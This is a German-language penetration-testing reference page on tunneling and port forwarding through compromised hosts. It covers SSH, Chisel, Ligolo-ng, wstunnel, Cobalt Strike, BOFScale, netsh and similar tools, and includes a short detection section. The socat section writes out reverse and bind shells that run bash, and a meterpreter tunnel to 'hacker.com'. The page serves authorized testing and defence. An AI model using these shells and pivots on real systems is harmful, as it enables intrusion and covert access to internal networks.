# Tunneling und Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-Tipp

> [!WARNING]
> Nmaps Proxy-Unterstützung ist auf TCP-Verbindungen beschränkt und wirkt sich nicht auf Ping-, Port- oder OS-Erkennungsscans aus. Wenn sich der Scanner hinter einem SOCKS-Proxy befindet, **deaktiviere die Host-Erkennung** (`-Pn`) und verwende einen **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Der letzte Befehl verwendet die Optionen `-u` und `-i` von Evil-WinRM, um das Konto und den WinRM-Host anzugeben. Der Standardport von WinRM ist 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH kann X11-Verbindungen, beliebige TCP-Ports und Unix-Domain-Sockets über seinen verschlüsselten Kanal weiterleiten.<sup>[[6]](#references)</sup>

Grafische SSH-Verbindung (X)

`-Y` aktiviert die vertrauenswürdige X11-Weiterleitung und `-C` fordert die Komprimierung weitergeleiteter Daten an.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Neuen Port im SSH-Server öffnen --> Anderer Port

Remote-Forwarding (`-R`) lauscht auf dem SSH-Server und verbindet sich mit der lokalen Seite; die angegebene Bind-Adresse legt fest, über welche Schnittstellen dieser Listener erreichbar ist.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Lokaler Port --> Kompromittierter Host (SSH) --> Third_box:Port

Die lokale (`-L`) Weiterleitung lauscht auf dem Client und verbindet sich vom SSH-Server aus mit dem Ziel.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Lokaler Port --> kompromittierter Host (SSH) --> Wohin auch immer

Dynamic (`-D`) forwarding erstellt einen lokalen SOCKS4/SOCKS5-Listener, dessen Verbindungen von der Remote-Seite aus geöffnet werden.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop mit ProxyJump

`-J`/`ProxyJump` verbindet sich über einen oder mehrere durch Kommas getrennte Jump-Hosts mit dem Ziel. Die Forwarding-Optionen gelten weiterhin für die endgültige SSH-Verbindung. Daher öffnet der SOCKS-Listener unten Verbindungen zu Zielen von `internal-target` aus und nicht von der ersten Bastion. So muss man sich nicht bei einem Jump-Host anmelden und dort einen zweiten SSH-Client starten.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Host-spezifische Optionen für Jump-Hosts sollten in `~/.ssh/config` eingetragen werden; Konfigurationen auf der Kommandozeile, die für das Ziel vorgesehen sind, werden nicht automatisch auf Zwischenhosts angewendet.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Dies ist nützlich, um Reverse Shells von internen Hosts über eine DMZ zu deinem Host zu erhalten:

Die Einstellung `GatewayPorts` des Servers steuert, ob ein Remote Forward auch außerhalb des Loopback-Interfaces binden darf; der Standardwert ist `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Dieses auf `root` basierende Beispiel erstellt Tunnelgeräte auf beiden Hosts. Der Server muss tun-Weiterleitung erlauben und das ausgewählte Konto muss Zugriff auf das tun-Gerät haben; `PermitRootLogin yes` ist eine Möglichkeit, hier das Konto `root` zu verwenden.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Weiterleitung auf der Serverseite aktivieren

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Eine neue Route auf der Client-Seite einrichten

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Sicherheit – Terrapin-Angriff (CVE-2023-48795)**  
> OpenSSH 9.6 hat eine strict-KEX-Erweiterung hinzugefügt, um Terrapins Integritätsangriff in der frühen Transportphase abzuwehren. Aktualisieren Sie nach Möglichkeit beide Kommunikationspartner und befolgen Sie bei älteren Implementierungen die Herstellerhinweise, statt davon auszugehen, dass ein weitergeleiteter Kanal allein aufgrund der Version geschützt ist.<sup>[[8]](#references)</sup>

## SSHUTTLE

Sie können den gesamten Datenverkehr über **ssh** durch einen Host zu einem Subnetz **tunneln**.\
Beispielsweise den gesamten Datenverkehr weiterleiten, der an 10.10.10.0/24 geht.

`sshuttle` ermöglicht transparentes Proxying über SSH und unterstützt die Auswahl von Subnetzen sowie eines benutzerdefinierten SSH-Befehls, wie unten gezeigt.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Mit einem privaten Schlüssel verbinden

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploits `portfwd` unterstützt lokales und entferntes Forwarding, während sein SOCKS-Proxy-Modul für die Verwendung mit Session-Routen oder `autoroute` vorgesehen ist und in diesen Beispielen standardmäßig auf Port 1080 lauscht.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Eine weitere Möglichkeit:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strikes Beacon kann SOCKS4a-/SOCKS5-Verbindungen über einen Beacon weiterleiten; `rportfwd` bindet auf dem kompromittierten Host, während `rportfwd_local` die Zielverbindung vom Cobalt Strike-Client aus initiiert.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Öffne einen Port im Team Server auf den Schnittstellen, über die der Traffic durch den Beacon geleitet werden soll.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> In diesem Fall wird der **Port auf dem Beacon-Host geöffnet**, nicht auf dem Team Server, und der Datenverkehr wird an den Team Server und von dort an den angegebenen Host:Port gesendet.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Das Handbuch zum Reverse Forwarding weist auf folgendes Verhalten hin:<sup>[[14]](#references)</sup>

- Beacons Reverse Port Forward ist dafür ausgelegt, **Traffic zum Team Server zu tunneln, nicht für das Weiterleiten zwischen einzelnen Rechnern**.
- Der Traffic wird **innerhalb des C2-Traffics von Beacon getunnelt**, einschließlich P2P-Links.
- Hohe Ports umgehen in der Regel Einschränkungen für privilegierte Ports, aber die Richtlinien des Zielbetriebssystems und vorhandene Listener gelten weiterhin.

### rPort2Port local

> [!WARNING]
> In diesem Fall wird der **Port auf dem Beacon-Host geöffnet**, nicht auf dem Team Server, und der **Traffic wird zum Cobalt Strike-Client gesendet** (nicht zum Team Server) und von dort zum angegebenen Host:Port.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale – CDN-vorgelagertes In-Process-Tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) führt ein modifiziertes Tailscale-Overlay innerhalb eines Windows-C2-Implants aus, ohne einen TUN-Treiber oder Dienst zu installieren. Es besteht aus drei Komponenten: einem asynchronen CGo-`c-shared`-`tailscaled`-BOF-PE, einem kleinen C++-BOF-PE, das mit der lokalen API kommuniziert, und einer asynchronen `socksportfwd`-TCP-zu-SOCKS5-Bridge.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-kompatibles TS2021 und DERP

Tailscale verwendet für den Noise-basierten TS2021-Kontrollkanal und das DERP-Relay normalerweise proprietäre HTTP-Upgrades. BOFScale behält diese Bytestreams bei, überträgt sie jedoch in RFC-6455-WebSockets mit `Sec-WebSocket-Protocol: ts2021` oder `derp`. Dadurch kann ein vom Operator kontrollierter Headscale-/DERP-Ursprung hinter einem CDN betrieben werden, das nur standardmäßige WebSocket-Upgrades akzeptiert. Der gepatchte Client versucht TS2021 nach einem HTTP-`500` erneut über WebSockets und DERP nach einem HTTP-`426`. Außerdem berücksichtigt der DERP-WebSocket-Dialer die Host-Proxy-Konfiguration. Der BOF setzt `TS_DEBUG_DERP_WS_CLIENT=1`, um den bekanntermaßen fehlschlagenden ersten Versuch zu überspringen.<sup>[[53]](#references)[[54]](#references)</sup>

Das CDN und der Origin-Proxy müssen WebSocket-Upgrades für `/ts2021` und `/derp` durchreichen, `/key` als gewöhnliches HTTP weiterleiten und interne Lese-/Schreib-Timeouts deaktivieren, da Relay-Sitzungen unbegrenzt offen bleiben können. Die bereitgestellte Headscale-Konfiguration aktiviert `verify_clients`, veröffentlicht ausschließlich die eingebettete DERP-Map des Operators und lässt `derp.urls` leer, um einen Fallback auf von Tailscale betriebene Relays zu verhindern.<sup>[[53]](#references)[[54]](#references)</sup>

### In-Process-Daemon und Named-Pipe-Steuerung

Sofern nicht anders angegeben, startet der BOF-Einstiegspunkt `tailscaled` mit `-tun=userspace-networking`, `-state mem:` und `-no-logs-no-support` und erstellt anschließend eine UUID-benannte Pipe. Go-stdout/stderr wird über eine OS-Pipe an die Beacon-Output-API umgeleitet. Dadurch bleiben der gesamte Daemon und die Go-Runtime resident, während Status und Logs nicht in ein Tailscale-Verzeichnis geschrieben werden.<sup>[[53]](#references)[[54]](#references)</sup>

Der schlanke Client bildet Tailscales lokale HTTP/1.0-API über diese Pipe nach. Er öffnet die Pipe mit `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, da die `safesocket`-Schicht des Daemons den Pipe-Client impersoniert, sendet `Tailscale-Cap: 125` und ordnet die lokale API den Operationen `up`, `down`, `status`, Routenankündigung und Herunterfahren zu.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Entlade ein manuell gemapptes Go-BOF-PE nicht, nachdem du den Daemon zum Herunterfahren aufgefordert hast: Goroutinen der Runtime und des Garbage Collectors können weiterhin Code aus Speicher ausführen, den der Loader unmapped. Führe `tailscaled` in einem entbehrlichen Prozess aus und beende diesen Prozess zur endgültigen Bereinigung.<sup>[[54]](#references)</sup>

### Vom Host ausgehenden Traffic über SOCKS5 im Userspace weiterleiten

Eingehende Tailnet-Verbindungen und angekündigte Subnetzrouten funktionieren innerhalb des Userspace-Netzwerk-Stacks, aber normale Prozesse auf dem kompromittierten Host haben keine OS-Route in das Overlay. `socksportfwd` lauscht deshalb an einem TCP-Port, der vom Opfer aus erreichbar ist, handelt mit dem Listener des Daemons unter `0.0.0.0:1080` SOCKS5 `NO AUTH` aus, sendet für ein Tailnet-Ziel eine `CONNECT`-Anfrage und leitet den Traffic asynchron in beide Richtungen weiter. Ist das Ziel ein MagicDNS-Name, wird `ATYP_DOMAIN` verwendet, sodass `tailscaled` den Namen auflöst, ohne ihn dem Windows-Resolver offenzulegen.<sup>[[53]](#references)[[54]](#references)</sup>

Ein minimaler Operator-Ablauf ist unten dargestellt. Sowohl der Operator-Knoten als auch das Implant müssen die gepatchten Binaries verwenden, da Stock-Tailscale dieses CDN-Design nicht durchlaufen kann.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Der Local Forward kann den scheinbaren Authentication-Listener vom Relay-Tool trennen: Zwinge einen Rechner dazu, sich am gebundenen Port des kompromittierten Hosts zu authentifizieren, leite die Verbindung durch das Tailnet an `ntlmrelayx` weiter und relaye sie anschließend zu AD CS, LDAP, HTTP, SMB oder einem anderen kompatiblen Ziel. Informationen zu den schwachstellenspezifischen Schritten findest du unter [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) und [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8); BOFScale dient nur als Transport.<sup>[[54]](#references)</sup>

### Erkennung

Suche nach der Kombination statt nach einem einzelnen schwachen Indikator: einer Go-Runtime in einem Prozess, der normalerweise nicht auf Go basiert, einer UUID-Pipe mit permissiver SDDL `D:(A;;GA;;;WD)`, einem unerwarteten SOCKS-Listener auf `0.0.0.0:1080` und langlebigen TLS-WebSockets zu CDN-Adressen. Bei TLS-Inspektion sollte `Sec-WebSocket-Protocol: derp` oder `ts2021` markiert werden, wenn der zugehörige Prozess kein autorisierter `tailscaled`-Dienst ist. Die `bofscale.yar`-Regeln des Repositorys enthalten Memory-Signaturen für alle drei BOF-PE-Komponenten.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Das Projekt stellt Web-Tunnel-Endpunkte wie `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` und `tunnel.php` bereit; lade einen unterstützten Endpunkt hoch, bevor du den lokalen Proxy startest.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Du kannst es auf der Releases-Seite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen\
Chisel überträgt TCP/UDP-Traffic über HTTP und verwendet dafür eine SSH-geschützte Verbindung. Verwende kompatible Client-/Server-Builds und prüfe die Befehlssyntax der ausgewählten Release-Version.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) leitet statische oder dynamische Forwards über WebSocket, HTTP/2 oder WebTransport (HTTP/3 über QUIC) weiter. Aktuelle Builds unterstützen TCP, UDP, Unix-Sockets, stdio, SOCKS5, HTTP-Proxying und Linux-Listener für transparente Proxys sowohl im Forward- als auch im Reverse-Modus.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Führe den Server auf dem Angreifer aus und lasse den Pivot sich mit `-R` ausgehend verbinden. In dieser Richtung wird der SOCKS5-Listener auf dem **Server** erstellt, während angeforderte Verbindungen aus dem Netzwerk des **Clients/Pivots** stammen.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Ein reverse static forward verwendet dieselbe Richtung. Zum Beispiel macht das Folgende `10.10.10.20:445`, wie über den pivot erreichbar, auf dem Loopback-Port `8445` des Angreifers verfügbar:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress- und Transportdetails

- Füge `-p http://user:pass@proxy:8080` zum Client hinzu, um einen expliziten HTTP-Proxy zu passieren. Verwende in Clients wie `curl` `socks5h://127.0.0.1:1080` (oder aktiviere proxied DNS in der Anwendung), damit interne Namen jenseits des Tunnels aufgelöst und nicht an den lokalen Resolver weitergegeben werden.<sup>[[52]](#references)</sup>
- `wss://` wählt TLS-geschütztes WebSocket. Ein `https://`-Client wählt HTTP/2, aber Pufferung oder die Konvertierung zu HTTP/1 durch Reverse-Proxys/CDNs unterbricht häufig den bidirektionalen Datenstrom. Stelle beim Testen dieses Modus den wstunnel-Server direkt bereit.<sup>[[52]](#references)</sup>
- `wts://` wählt WebTransport über QUIC. Starte den Server mit `--enable-webtransport` (oder einer `wts://`-Listen-URL) und erlaube UDP auf dem Listening-Port. Dieser Modus kann keinen herkömmlichen HTTP-`CONNECT`-Proxy passieren, da dieser TCP überträgt.<sup>[[52]](#references)</sup>

> [!WARNING]
> Das Upstream-Projekt warnt davor, das eingebettete selbstsignierte Zertifikat als Schutz der Privatsphäre zu betrachten. Verwende vorzugsweise ein gültiges benutzerdefiniertes Zertifikat plus `--tls-verify-certificate` (oder mTLS), lasse Proxy-Listener auf Loopback, sofern kein Fernzugriff beabsichtigt ist, und tunnel bereits sichere Protokolle, wenn Vertraulichkeit wichtig ist.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Der Ligolo-ng-Schnellstart beschreibt eine TUN-Schnittstelle auf dem Proxy, die Validierung des Zertifikat-Fingerabdrucks für den Agent und das Einrichten von Routen für das getunnelte Netzwerk.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent-Bindung und Lauschen

Ligolo-ng kann auf dem Agent Listener hinzufügen, die an eine proxyseitige Adresse weiterleiten. Außerdem kann sein reservierter Bereich `240.0.0.0/4` geroutet werden, um agentlokale Dienste zu erreichen.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Zugriff auf lokale Ports des Agents

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot startet den Rückwärtstunnel vom Opfer aus und stellt eine SOCKS4-Proxy auf der Loopback-Adresse des Angreifers bereit; das README dokumentiert außerdem NTLM-Proxy-Zugangsdaten und Hash-Optionen.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot durch **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombiniert Adresstypen wie `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` und `PROXY`; die folgenden Beispiele kombinieren diese dokumentierten Endpunkte.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port über socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter über SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Du kannst einen **nicht authentifizierten Proxy** mit socats dokumentiertem Adresstyp `PROXY` durchlaufen, indem du diese Zeile anstelle der letzten in der Konsole des Opfers ausführst.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL-Socat-Tunnel

**/bin/sh-Konsole**

Erstelle Zertifikate auf beiden Seiten: Client und Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Verbinde den lokalen SSH-Port (22) mit Port 443 des Angreifer-Hosts.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink ist PuTTYs Verbindungstool für die Kommandozeile und bietet SSH-Weiterleitungsoptionen ähnlich wie `ssh`.<sup>[[22]](#references)</sup>

Verwende für den SSH-Port das große `-P`. `-pw` wird aus Kompatibilitätsgründen beibehalten, legt das Passwort jedoch in der Prozessliste offen; verwende nach Möglichkeit Schlüssel-Authentifizierung oder `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Da diese Binärdatei auf dem Opfer ausgeführt wird und ein SSH-Client ist, öffne den SSH-Dienst und -Port für die Rückverbindung; im Folgenden wird `-R` verwendet, um einen lokal erreichbaren Port an den Rechner des Angreifers weiterzuleiten.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Verwende beim Erstellen oder Ändern persistenter `portproxy`-Regeln einen Kontext mit den erforderlichen Berechtigungen auf dem Host. Microsoft dokumentiert die unten verwendeten Formen `v4tov4` zum Hinzufügen, Anzeigen und Löschen.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### `portproxy` über eine geplante Aufgabe bereitstellen

Wenn administrative Anmeldedaten verfügbar sind, kann die Remote-Ausführung über die Aufgabenplanung eine native Weiterleitungsregel installieren, ohne einen dedizierten Relay hochzuladen. Beispielsweise kann [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) einen Pivot auf TCP/443 lauschen und die Verbindung an einen internen SMB-Dienst weiterleiten lassen.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Die Regel bleibt bestehen. Führe daher `netsh interface portproxy show v4tov4` aus, um sie aufzulisten, und entferne sie nach dem Test ausdrücklich. Denk daran, dass `portproxy` nur die Weiterleitung übernimmt; die Host-Firewall muss den Listening-Port ebenfalls zulassen.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Du benötigst **RDP-Zugriff auf das System**.\
Herunterladen:

SocksOverRDP verwendet Remote Desktop Dynamic Virtual Channels, um eine SOCKS5-Verbindung über eine bestehende RDP-Sitzung zu übertragen. Das Client-Plugin lauscht auf `127.0.0.1:1080`, während die Serverkomponente auf dem RDP-Ziel ausgeführt wird.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) der Windows-Funktion Remote Desktop Service. DVC ist für das **Tunneln von Paketen über die RDP-Verbindung** zuständig.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Lade auf deinem Clientcomputer **`SocksOverRDP-Plugin.dll`** wie folgt:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Jetzt können wir uns mit **`mstsc.exe`** über **RDP** mit dem **victim** **verbinden**. Es sollte eine **Meldung** erscheinen, dass das **SocksOverRDP plugin** aktiviert ist und auf **127.0.0.1:1080** **lauscht**.

Über **RDP** **verbinden** und die Binärdatei `SocksOverRDP-Server.exe` auf den Rechner des **victim** hochladen und ausführen:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Überprüfe nun auf deinem Rechner (Angreifer), ob Port 1080 lauscht:

```
netstat -antb | findstr 1080
```

Jetzt kannst du [**Proxifier**](https://www.proxifier.com/) verwenden, um den Datenverkehr über diesen Port zu leiten.<sup>[[26]](#references)</sup>

### Suche nach RDP-Virtual-Channels

